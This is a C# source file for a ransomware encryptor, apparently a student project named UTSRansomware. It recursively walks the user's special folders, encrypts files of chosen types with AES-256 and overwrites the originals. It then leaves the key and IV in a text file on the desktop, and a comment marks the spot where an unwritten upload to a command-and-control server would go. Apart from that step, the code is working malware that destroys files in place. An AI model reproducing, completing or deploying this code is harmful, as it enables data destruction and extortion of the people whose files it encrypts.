using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;

namespace UTSRansomware
{
    public class Encryptor
    {

        public byte[] key;
        public byte[] iv;



        // Constructor to generate new key and IV
        public Encryptor()
        {
            this.key = GenerateKey();
            this.iv = GenerateIV();
        }

        // Loops over special directories and encrypts all files in them
        public void EncryptSpecialDirectories()
        {
            foreach (Environment.SpecialFolder folder in Utils.specialFolders) 
            {
                string folderPath = Environment.GetFolderPath(folder);
                if (Directory.Exists(folderPath))
                {
                    /* 
                     * As this just brute force tries every file in these directories it run into a lot of
                     * UnauthorizedAccessException as even when running with admin credentials files can be still
                     * locked or not accessable.
                    */
                    try
                    {
                        EncryptDirectory(folderPath);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine($"Access denied to: {folderPath}. Skipping...");
                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                }
            }
            /* 
             * After all encryption completed save the key and iv to text file
             * This is where the upload to a C2 should happen but I haven't implemented that yet
             */
            SaveKeyAndIvToDesktop();
        }

        // Encrypts all files in a directory, recursviely calls istelf to encrypt files in sub directories
        private void EncryptDirectory(string parentDirectory)
        {
            string[] filePaths = Directory.GetFiles(parentDirectory);
            string[] directoryPaths = Directory.GetDirectories(parentDirectory);

            foreach (string directoryPath in directoryPaths)
            {
                EncryptDirectory(directoryPath);
            }

            // Using multi threaded processing to try improve speed
            // Don't think this is working properly so will have to fix
            Parallel.ForEach(filePaths, (filePath) =>
            {
                string fileExtension = Path.GetExtension(filePath);
                if (Utils.fileExtensions.Contains(fileExtension))
                {
                    try
                    {
                        EncryptFile(filePath);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine($"Access denied to: {filePath}. Skipping...");
                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
            });
        }

        // Encrypts a file
        public void EncryptFile(string filePath)
        {
            // Instantiate Aes and configure its settings
            using (Aes aesAlg = Aes.Create())
            {
                string tempFilePath = filePath + ".temp";
                aesAlg.Mode = CipherMode.CBC; // Setting the Cipher mode to CBC
                aesAlg.Padding = PaddingMode.PKCS7; // Default is PKCS7
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Outputs as a temp file that is then used to overwrite the original file
                using (FileStream fsIn = new FileStream(filePath, FileMode.Open))
                using (FileStream fsOut = new FileStream(tempFilePath, FileMode.Create))
                using (CryptoStream cs = new CryptoStream(fsOut, encryptor, CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[1024];
                    int readBytes;

                    while ((readBytes = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cs.Write(buffer, 0, readBytes);
                    }
                }
                File.Delete(filePath);
                File.Move(tempFilePath, filePath);
                Console.WriteLine("Encrypted: " + filePath);
            }
        }

        // Generates a random key
        private static byte[] GenerateKey()
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256; // AES 256
                aes.GenerateKey();
                string keyAsString = Convert.ToBase64String(aes.Key);
                Console.WriteLine($"Key generated: {keyAsString}");
                return aes.Key;
            }
        }

        // Generates a random IV
        private static byte[] GenerateIV()
        {
            using (Aes aes = Aes.Create())
            {
                aes.GenerateIV();
                string ivAsString = Convert.ToBase64String(aes.IV);
                Console.WriteLine($"IV generated: {ivAsString}");
                return aes.IV;
            }
        }

        // Writes key and iv to desktop
        private void SaveKeyAndIvToDesktop()
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string fileName = Path.Combine(desktopPath, "key_iv.txt");

            // Convert key and IV to Base64 strings
            string keyAsString = Convert.ToBase64String(this.key);
            string ivAsString = Convert.ToBase64String(this.iv);

            // Combine them into a single string and write to file
            string combined = $"Key: {keyAsString}\nIV: {ivAsString}";

            File.WriteAllText(fileName, combined);
        }


    }
}
